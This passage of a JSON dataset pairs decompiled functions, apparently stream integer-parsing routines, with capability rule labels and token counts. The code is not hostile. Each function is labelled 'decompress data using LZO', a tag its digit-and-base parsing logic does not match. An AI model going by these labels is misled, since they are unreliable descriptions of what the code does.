false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar9 = (**(*arg_8h + 0x24))();\n                            var_50h._2_1_ = false;\n                            if (iVar9 == -1) {\n                                arg_8h = NULL;\n                                var_50h._2_1_ = true;\n                            }\n                        }\n                    }\n                    else {\n                        var_50h._1_1_ = var_50h._1_1_ | 0xffff - iVar9 < (var_48h * uVar14 & 0xffff);\n                        var_48h = iVar9 + var_48h * uVar14;\n                        uVar6 = arg_8h[2];\n                        var_44h = var_44h + 1;\n                        if (uVar6 < arg_8h[3]) goto code_r0x00446dc9;\ncode_r0x00447096:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00446dd6;\n                        var_50h._2_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar11 = arg_10h != NULL && arg_14h == -1;\n                    bVar2 = arg_14h == -1;\n                    if ((bVar11) && (bVar2 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar9 = (**(*arg_10h + 0x24))();\n                        bVar2 = false;\n                        if (iVar9 == -1) {\n                            arg_10h = NULL;\n                            bVar2 = bVar11;\n                        }\n                    }\n                    if (var_50h._2_1_ == bVar2) {\n                        var_50h._2_1_ = 1;\n                        goto code_r0x00446e0d;\n                    }\n                    uVar13 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x00446d62;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar13 = *arg_8h[2];\n                        goto code_r0x00446d62;\n                    }\n                    uVar13 = (**(*arg_8h + 0x24))();\n                    if (uVar13 != 0xffffffff) goto code_r0x00446d62;\n                    arg_8h = NULL;\n                    if (var_4ch < 0xb) break;\n                    cVar3 = -1;\n                    iVar9 = -1;\ncode_r0x00446feb:\n                    if (5 < cVar3 + 0x9fU) goto code_r0x00447150;\n                    iVar9 = iVar9 + -0x57;\n                    if (iVar9 == -1) break;\n                } while( true );\n            }\n            goto code_r0x00447002;\n        }\n        var_50h._2_1_ = var_50h._3_1_;\n        var_50h._1_1_ = 0;\n        var_50h._3_1_ = 0;\n        var_48h._0_2_ = 0;\n    }\n    else {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x004471ba:\n            uVar6 = var_2ch;\n            cVar3 = uVar13;\n            if ((*(iVar5 + 0x10) == 0) || (*(iVar5 + 0x25) != cVar3)) {\n                if ((cVar3 == *(iVar5 + 0x24)) ||\n                   (iVar9 = sub.msvcrt.dll_memchr(iVar5 + 0x4e, cVar3, var_4ch),  iVar9 == 0)) goto code_r0x00447002;\n                iVar9 = iVar9 - (iVar5 + 0x4e);\n                if (0xf < iVar9) {\n                    iVar9 = iVar9 + -6;\n                }\n                if (var_48h <= var_54h) {\n                    var_50h._1_1_ = var_50h._1_1_ | 0xffff - iVar9 < (var_48h * uVar14 & 0xffff);\n                    var_44h = var_44h + 1;\n                    var_48h = iVar9 + var_48h * uVar14;\n                    goto code_r0x0044722a;\n                }\n                uVar6 = arg_8h[2];\n                var_50h._1_1_ = var_50h._2_1_;\n                if (arg_8h[3] <= uVar6) goto code_r0x00447284;\ncode_r0x00447235:\n                arg_8h[2] = uVar6 + 1;\ncode_r0x00447242:\n                var_5ch._0_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar9 = (**(*arg_8h + 0x24))();\n                    var_5ch._0_1_ = 0;\n                    if (iVar9 == -1) {\n                        arg_8h = NULL;\n                        var_5ch._0_1_ = var_50h._2_1_;\n                    }\n                }\n            }\n            else {\n                if (var_44h == 0) {\n                    var_50h._2_1_ = 0;\n                    var_50h._3_1_ = *(iVar5 + 0x10);\n                    goto code_r0x00446e0d;\n                }\n                uVar13 = var_2ch + 1;\n                uVar7 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar7 = var_28h;\n                }\n                if (uVar7 < uVar13) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                var_44h = 0;\n                *(stack0xffffffcc + uVar6) = var_44h;\n                *(stack0xffffffcc + uVar13) = 0;\n                var_2ch = uVar13;\ncode_r0x0044722a:\n                uVar6 = arg_8h[2];\n                if (uVar6 < arg_8h[3]) goto code_r0x00447235;\ncode_r0x00447284:\n                (**(*arg_8h + 0x28))();\n                var_5ch._0_1_ = var_50h._2_1_;\n                if (arg_8h != NULL) goto code_r0x00447242;\n            }\n            arg_ch = 0xffffffff;\n            bVar11 = arg_10h != NULL && arg_14h == -1;\n            bVar2 = arg_14h == -1;\n            if ((bVar11) && (bVar2 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar9 = (**(*arg_10h + 0x24))();\n                bVar2 = false;\n                if (iVar9 == -1) {\n                    arg_10h = NULL;\n                    bVar2 = bVar11;\n                }\n            }\n            if (bVar2 == var_5ch) goto code_r0x00446e0d;\n            uVar13 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar13 = *arg_8h[2];\n                }\n                else {\n                    uVar13 = (**(*arg_8h + 0x24))();\n                    if (uVar13 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar13 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x004471ba;\n        }\n        var_50h._1_1_ = 0;\n        var_50h._3_1_ = 0;\n        var_50h._2_1_ = uVar1;\n        var_48h._0_2_ = 0;\n    }\ncode_r0x00446e0d:\n    if (var_2ch != 0) goto code_r0x00447011;\ncode_r0x00446e15:\n    if ((var_44h != 0) || (bVar10)) {\ncode_r0x00447056:\n        if (var_50h._3_1_ == 0) {\n            if (var_50h._1_1_ == 0) {\n                uVar4 = -var_48h;\n                if (!bVar8) {\n                    uVar4 = var_48h;\n                }\n                *arg_20h = uVar4;\n            }\n            else {\n                *arg_20h = 0xffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00446e3b;\n        }\n    }\ncode_r0x00446e2a:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00446e3b:\n    if (var_50h._2_1_ != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00447150:\n    if (5 < cVar3 + 0xbfU) goto code_r0x00447002;\n    iVar9 = iVar9 + -0x37;\n    goto code_r0x00446d84;\ncode_r0x00447002:\n    var_50h._2_1_ = 0;\n    if (var_2ch == 0) goto code_r0x00446e15;\ncode_r0x00447011:\n    fcn.004929c0(var_44h);\n    cVar3 = fcn.0049e840(*(iVar5 + 8), *(iVar5 + 0xc), &var_31h + 1);\n    if (cVar3 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar10) || ((var_44h | var_2ch) != 0)) goto code_r0x00447056;\n    goto code_r0x00446e2a;\n}\n",
        "token_count": 5075
    },
    "00447630": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00447630(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    uint32_t uVar9;\n    char cVar10;\n    bool bVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint var_6dh;\n    uint32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_44h;\n    uint8_t var_43h;\n    uint8_t var_42h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    iVar6 = arg_18h;\n    uVar13 = 8;\n    iVar3 = fcn.0042e410(arg_18h + 0x6c);\n    uVar4 = *(iVar6 + 0xc) & 0x4a;\n    if ((uVar4 != 0x40) && (uVar13 = 0x10,  uVar4 != 8)) {\n        uVar13 = 10;\n    }\n    bVar8 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar15 = arg_ch == 0xffffffff;\n    if (((bVar8) && (bVar15 = false,  arg_8h[3] <= arg_8h[2])) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n        arg_8h = NULL;\n        bVar15 = bVar8;\n    }\n    bVar8 = arg_10h != NULL && arg_14h == -1;\n    var_48h._0_1_ = arg_14h == -1;\n    if ((bVar8) && (var_48h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar6 = (**(*arg_10h + 0x24))();\n        var_48h._0_1_ = false;\n        if (iVar6 == -1) {\n            arg_10h = NULL;\n            var_48h._0_1_ = bVar8;\n        }\n    }\n    if (var_48h == bVar15) {\n        bVar8 = false;\n        uVar7 = 0;\n        var_42h = 1;\n        var_48h = 0;\n        bVar15 = false;\n    }\n    else {\n        uVar7 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar7 = *arg_8h[2];\n            }\n            else {\n                uVar7 = (**(*arg_8h + 0x24))();\n                if (uVar7 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar7 = 0xffffffff;\n                }\n            }\n        }\n        cVar2 = *(iVar3 + 0x10);\n        cVar10 = uVar7;\n        bVar8 = *(iVar3 + 0x4a) == cVar10;\n        if ((bVar8) || (*(iVar3 + 0x4b) == cVar10)) {\n            if (((cVar2 == '\\0') || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_42h = fcn.00430ce0(&arg_10h);\n                var_48h = 0;\n                bVar15 = false;\n                if (var_42h != 0) goto code_r0x00447731;\n                uVar7 = fcn.00430d80();\n                cVar2 = *(iVar3 + 0x10);\n            }\n        }\n        else {\n            bVar8 = false;\n        }\n        var_48h = 0;\n        bVar15 = false;\n        while (((cVar10 = uVar7,  cVar2 == '\\0' || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10))) {\n            if (*(iVar3 + 0x4e) == cVar10) {\n                bVar1 = uVar13 == 10 | bVar15 ^ 1U;\n                if (!bVar1) goto code_r0x00447970;\n                bVar15 = uVar4 == 0 || uVar13 == 8;\n                if (uVar4 != 0 && uVar13 != 8) {\n                    var_48h = var_48h + 1;\n                    goto code_r0x004479a4;\n                }\n                var_48h = 0;\n                uVar13 = 8;\n                uVar12 = arg_8h[2];\n                if (arg_8h[3] <= uVar12) {\n                    uVar13 = 8;\n                    goto code_r0x00447a50;\n                }\ncode_r0x004479b3:\n                arg_8h[2] = uVar12 + 1;\ncode_r0x004479c0:\n                var_50h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n                    arg_8h = NULL;\n                    var_50h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar15) break;\ncode_r0x00447970:\n                if ((*(iVar3 + 0x4c) != cVar10) && (*(iVar3 + 0x4d) != cVar10)) {\n                    var_42h = 0;\n                    bVar15 = true;\n                    goto code_r0x00447731;\n                }\n                var_42h = uVar13 == 0x10 || uVar4 == 0;\n                if (uVar13 != 0x10 && uVar4 != 0) {\n                    bVar15 = true;\n                    goto code_r0x0044773d;\n                }\n                var_48h = 0;\n                uVar13 = 0x10;\n                bVar1 = false;\ncode_r0x004479a4:\n                uVar12 = arg_8h[2];\n                bVar15 = bVar1;\n                if (uVar12 < arg_8h[3]) goto code_r0x004479b3;\ncode_r0x00447a50:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x004479c0;\n                var_50h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar1 = arg_10h != NULL && arg_14h == -1;\n            var_42h = arg_14h == -1;\n            if ((bVar1) && (var_42h = false,  arg_10h[3] <= arg_10h[2])) {\n                var_42h = false;\n                iVar6 = (**(*arg_10h + 0x24))();\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    var_42h = bVar1;\n                }\n            }\n            if (var_42h == var_50h._0_1_) {\n                var_42h = 1;\n                goto code_r0x00447731;\n            }\n            uVar7 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar7 = *arg_8h[2];\n                }\n                else {\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar7 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar15) break;\n            cVar2 = *(iVar3 + 0x10);\n        }\n        var_42h = 0;\n    }\ncode_r0x00447731:\n    var_54h = 0x16;\n    if (uVar13 != 0x10) {\ncode_r0x0044773d:\n        var_54h = uVar13;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.004924e0(0x20);\n    }\n    var_68h = 0;\n    var_64h = -0x80000000;\n    if (!bVar8) {\n        var_68h = 0xffffffff;\n        var_64h = 0x7fffffff;\n    }\n    uVar16 = fcn.00418980(var_68h, var_64h, uVar13, 0);\n    uVar4 = uVar16 >> 0x20;\n    var_43h = *(iVar3 + 100);\n    if (var_43h == 0) {\n        if (var_42h == 0) {\n            var_44h = 0;\n            uVar12 = 0;\n            uVar14 = 0;\ncode_r0x004477e0:\n            cVar2 = uVar7;\n            iVar6 = cVar2;\n            if (var_54h < 0xb) {\n                if ((cVar2 < '0') || (var_54h + '0' <= cVar2)) goto code_r0x00447ac2;\n            }\n            else if (9 < cVar2 - 0x30U) goto code_r0x00447aab;\n            uVar7 = iVar6 - 0x30;\ncode_r0x00447802:\n            if (uVar7 != 0xffffffff) {\n                do {\n                    if (uVar4 < uVar14 || uVar4 - uVar14 < (uVar16 < uVar12)) {\n                        var_44h = 1;\n                        uVar7 = arg_8h[2];\n                        if (arg_8h[3] <= uVar7) goto code_r0x00447b73;\ncode_r0x00447862:\n                        arg_8h[2] = uVar7 + 1;\ncode_r0x0044786f:\n                        var_43h = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar6 = (**(*arg_8h + 0x24))();\n                            var_43h = false;\n                            if (iVar6 == -1) {\n                                arg_8h = NULL;\n                                var_43h = true;\n                            }\n                        }\n                    }\n                    else {\n                        uVar5 = uVar12 * uVar13;\n                        uVar14 = (uVar12 * uVar13 >> 0x20) + uVar13 * uVar14;\n                        uVar12 = (var_64h - (uVar7 >> 0x1f)) - (var_68h < uVar7);\n                        var_44h = var_44h | (uVar12 < uVar14 || uVar12 - uVar14 < (var_68h - uVar7 < uVar5));\n                        uVar12 = uVar5 + uVar7;\n                        uVar14 = uVar14 + (uVar7 >> 0x1f) + CARRY4(uVar5, uVar7);\n                        var_48h = var_48h + 1;\n                        uVar7 = arg_8h[2];\n                        if (uVar7 < arg_8h[3]) goto code_r0x00447862;\ncode_r0x00447b73:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044786f;\n                        var_43h = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar11 = arg_10h != NULL && arg_14h == -1;\n                    bVar1 = arg_14h == -1;\n                    if ((bVar11) && (bVar1 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar6 = (**(*arg_10h + 0x24))();\n                        bVar1 = false;\n                        if (iVar6 == -1) {\n                            arg_10h = NULL;\n                            bVar1 = bVar11;\n                        }\n                    }\n                    if (bVar1 == var_43h) {\n                        var_43h = 1;\n                        goto code_r0x004478a6;\n                    }\n                    uVar7 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x004477e0;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar7 = *arg_8h[2];\n                        goto code_r0x004477e0;\n                    }\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 != 0xffffffff) goto code_r0x004477e0;\n                    arg_8h = NULL;\n                    if (var_54h < 0xb) break;\n                    cVar2 = -1;\n                    iVar6 = -1;\ncode_r0x00447aab:\n                    if (5 < cVar2 + 0x9fU) goto code_r0x00447c30;\n                    uVar7 = iVar6 - 0x57;\n                    if (uVar7 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x00447ac2;\n        }\n        var_43h = var_42h;\n        var_44h = 0;\n        uVar12 = 0;\n        var_42h = 0;\n        uVar14 = 0;\n    }\n    else {\n        if (var_42h == 0) {\n            var_44h = 0;\n            uVar12 = 0;\n            uVar14 = 0;\ncode_r0x00447c9b:\n            uVar5 = var_2ch;\n            cVar2 = uVar7;\n            if ((*(iVar3 + 0x10) == 0) || (*(iVar3 + 0x25) != cVar2)) {\n                if ((cVar2 == *(iVar3 + 0x24)) ||\n                   (iVar6 = sub.msvcrt.dll_memchr(iVar3 + 0x4e, cVar2, var_54h),  iVar6 == 0)) goto code_r0x00447ac2;\n                uVar7 = iVar6 - (iVar3 + 0x4e);\n                if (0xf < uVar7) {\n                    uVar7 = uVar7 - 6;\n                }\n                if (uVar14 <= uVar4 && (uVar16 < uVar12) <= uVar4 - uVar14) {\n                    uVar5 = uVar12 * uVar13;\n                    uVar14 = (uVar12 * uVar13 >> 0x20) + uVar13 * uVar14;\n                    uVar12 = (var_64h - (uVar7 >> 0x1f)) - (var_68h < uVar7);\n                    var_44h = var_44h | (uVar12 < uVar14 || uVar12 - uVar14 < (var_68h - uVar7 < uVar5));\n                    uVar12 = uVar5 + uVar7;\n                    uVar14 = uVar14 + (uVar7 >> 0x1f) + CARRY4(uVar5, uVar7);\n                    var_48h = var_48h + 1;\n                    goto code_r0x00447d32;\n                }\n                uVar7 = arg_8h[2];\n                var_44h = var_43h;\n                if (arg_8h[3] <= uVar7) goto code_r0x00447d92;\ncode_r0x00447d3d:\n                arg_8h[2] = uVar7 + 1;\ncode_r0x00447d4a:\n                var_6dh._1_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar6 = (**(*arg_8h + 0x24))();\n                    var_6dh._1_1_ = 0;\n                    if (iVar6 == -1) {\n                        arg_8h = NULL;\n                        var_6dh._1_1_ = var_43h;\n                    }\n                }\n            }\n            else {\n                if (var_48h == 0) {\n                    var_43h = 0;\n                    var_42h = *(iVar3 + 0x10);\n                    goto code_r0x004478a6;\n                }\n                uVar7 = var_2ch + 1;\n                uVar9 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar9 = var_28h;\n                }\n                if (uVar9 < uVar7) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                var_48h = 0;\n                *(stack0xffffffcc + uVar5) = var_48h;\n                *(stack0xffffffcc + uVar7) = 0;\n                var_2ch = uVar7;\ncode_r0x00447d32:\n                uVar7 = arg_8h[2];\n                if (uVar7 < arg_8h[3]) goto code_r0x00447d3d;\ncode_r0x00447d92:\n                (**(*arg_8h + 0x28))();\n                var_6dh._1_1_ = var_43h;\n                if (arg_8h != NULL) goto code_r0x00447d4a;\n            }\n            arg_ch = 0xffffffff;\n            bVar11 = arg_10h != NULL && arg_14h == -1;\n            bVar1 = arg_14h == -1;\n            if ((bVar11) && (bVar1 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar6 = (**(*arg_10h + 0x24))();\n                bVar1 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar1 = bVar11;\n                }\n            }\n            if (bVar1 == var_6dh._1_1_) goto code_r0x004478a6;\n            uVar7 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar7 = *arg_8h[2];\n                }\n                else {\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar7 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x00447c9b;\n        }\n        uVar12 = 0;\n        uVar14 = 0;\n        var_44h = 0;\n        var_43h = var_42h;\n        var_42h = 0;\n    }\ncode_r0x004478a6:\n    if (var_2ch != 0) goto code_r0x00447ad1;\ncode_r0x004478ae:\n    if ((var_48h != 0) || (bVar15)) {\ncode_r0x00447b19:\n        if (var_42h == 0) {\n            if (var_44h == 0) {\n                if (bVar8) {\n                    bVar15 = uVar12 != 0;\n                    uVar12 = -uVar12;\n                    uVar14 = -(uVar14 + bVar15);\n                }\n                *arg_20h = uVar12;\n                arg_20h[1] = uVar14;\n            }\n            else {\n                uVar4 = 0;\n                uVar13 = 0x80000000;\n                if (!bVar8) {\n                    uVar4 = 0xffffffff;\n                    uVar13 = 0x7fffffff;\n                }\n                *arg_20h = uVar4;\n                arg_20h[1] = uVar13;\n                *arg_1ch = 4;\n            }\n            goto code_r0x004478dc;\n        }\n    }\ncode_r0x004478c3:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x004478dc:\n    if (var_43h != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00447c30:\n    if (5 < cVar2 + 0xbfU) goto code_r0x00447ac2;\n    uVar7 = iVar6 - 0x37;\n    goto code_r0x00447802;\ncode_r0x00447ac2:\n    var_43h = 0;\n    if (var_2ch == 0) goto code_r0x004478ae;\ncode_r0x00447ad1:\n    fcn.004929c0(var_48h);\n    cVar2 = fcn.0049e840(*(iVar3 + 8), *(iVar3 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar15) || ((var_48h | var_2ch) != 0)) goto code_r0x00447b19;\n    goto code_r0x004478c3;\n}\n",
        "token_count": 5284
    },
    "00448130": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00448130(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    uint32_t uVar9;\n    char cVar10;\n    bool bVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint var_65h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_44h;\n    uint8_t var_43h;\n    uint8_t var_42h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    iVar6 = arg_18h;\n    uVar13 = 8;\n    iVar3 = fcn.0042e410(arg_18h + 0x6c);\n    uVar4 = *(iVar6 + 0xc) & 0x4a;\n    if ((uVar4 != 0x40) && (uVar13 = 0x10,  uVar4 != 8)) {\n        uVar13 = 10;\n    }\n    bVar8 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar15 = arg_ch == 0xffffffff;\n    if (((bVar8) && (bVar15 = false,  arg_8h[3] <= arg_8h[2])) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n        arg_8h = NULL;\n        bVar15 = bVar8;\n    }\n    bVar8 = arg_10h != NULL && arg_14h == -1;\n    var_48h._0_1_ = arg_14h == -1;\n    if ((bVar8) && (var_48h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar6 = (**(*arg_10h + 0x24))();\n        var_48h._0_1_ = false;\n        if (iVar6 == -1) {\n            arg_10h = NULL;\n            var_48h._0_1_ = bVar8;\n        }\n    }\n    if (var_48h == bVar15) {\n        bVar8 = false;\n        uVar7 = 0;\n        var_42h = 1;\n        var_48h = 0;\n        bVar15 = false;\n    }\n    else {\n        uVar7 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar7 = *arg_8h[2];\n            }\n            else {\n                uVar7 = (**(*arg_8h + 0x24))();\n                if (uVar7 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar7 = 0xffffffff;\n                }\n            }\n        }\n        cVar2 = *(iVar3 + 0x10);\n        cVar10 = uVar7;\n        bVar8 = *(iVar3 + 0x4a) == cVar10;\n        if ((bVar8) || (*(iVar3 + 0x4b) == cVar10)) {\n            if (((cVar2 == '\\0') || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_42h = fcn.00430ce0(&arg_10h);\n                var_48h = 0;\n                bVar15 = false;\n                if (var_42h != 0) goto code_r0x00448231;\n                uVar7 = fcn.00430d80();\n                cVar2 = *(iVar3 + 0x10);\n            }\n        }\n        else {\n            bVar8 = false;\n        }\n        var_48h = 0;\n        bVar15 = false;\n        while (((cVar10 = uVar7,  cVar2 == '\\0' || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10))) {\n            if (*(iVar3 + 0x4e) == cVar10) {\n                bVar1 = uVar13 == 10 | bVar15 ^ 1U;\n                if (!bVar1) goto code_r0x00448440;\n                bVar15 = uVar4 == 0 || uVar13 == 8;\n                if (uVar4 != 0 && uVar13 != 8) {\n                    var_48h = var_48h + 1;\n                    goto code_r0x00448474;\n                }\n                var_48h = 0;\n                uVar13 = 8;\n                uVar12 = arg_8h[2];\n                if (arg_8h[3] <= uVar12) {\n                    uVar13 = 8;\n                    goto code_r0x00448520;\n                }\ncode_r0x00448483:\n                arg_8h[2] = uVar12 + 1;\ncode_r0x00448490:\n                var_50h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n                    arg_8h = NULL;\n                    var_50h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar15) break;\ncode_r0x00448440:\n                if ((*(iVar3 + 0x4c) != cVar10) && (*(iVar3 + 0x4d) != cVar10)) {\n                    var_42h = 0;\n                    bVar15 = true;\n                    goto code_r0x00448231;\n                }\n                var_42h = uVar13 == 0x10 || uVar4 == 0;\n                if (uVar13 != 0x10 && uVar4 != 0) {\n                    bVar15 = true;\n                    goto code_r0x0044823d;\n                }\n                var_48h = 0;\n                uVar13 = 0x10;\n                bVar1 = false;\ncode_r0x00448474:\n                uVar12 = arg_8h[2];\n                bVar15 = bVar1;\n                if (uVar12 < arg_8h[3]) goto code_r0x00448483;\ncode_r0x00448520:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x00448490;\n                var_50h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar1 = arg_10h != NULL && arg_14h == -1;\n            var_42h = arg_14h == -1;\n            if ((bVar1) && (var_42h = false,  arg_10h[3] <= arg_10h[2])) {\n                var_42h = false;\n                iVar6 = (**(*arg_10h + 0x24))();\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    var_42h = bVar1;\n                }\n            }\n            if (var_50h._0_1_ == var_42h) {\n                var_42h = 1;\n                goto code_r0x00448231;\n            }\n            uVar7 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar7 = *arg_8h[2];\n                }\n                else {\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar7 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar15) break;\n            cVar2 = *(iVar3 + 0x10);\n        }\n        var_42h = 0;\n    }\ncode_r0x00448231:\n    var_54h = 0x16;\n    if (uVar13 != 0x10) {\ncode_r0x0044823d:\n        var_54h = uVar13;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.004924e0(0x20);\n    }\n    uVar16 = fcn.00418980(0xffffffff, 0xffffffff, uVar13, 0);\n    uVar4 = uVar16 >> 0x20;\n    var_43h = *(iVar3 + 100);\n    if (var_43h == 0) {\n        if (var_42h == 0) {\n            var_44h = 0;\n            uVar12 = 0;\n            uVar14 = 0;\ncode_r0x004482c0:\n            cVar2 = uVar7;\n            iVar6 = cVar2;\n            if (var_54h < 0xb) {\n                if ((cVar2 < '0') || (var_54h + '0' <= cVar2)) goto code_r0x00448592;\n            }\n            else if (9 < cVar2 - 0x30U) goto code_r0x0044857b;\n            uVar7 = iVar6 - 0x30;\ncode_r0x004482e2:\n            if (uVar7 != 0xffffffff) {\n                do {\n                    if (uVar4 < uVar14 || uVar4 - uVar14 < (uVar16 < uVar12)) {\n                        var_44h = 1;\n                        uVar7 = arg_8h[2];\n                        if (arg_8h[3] <= uVar7) goto 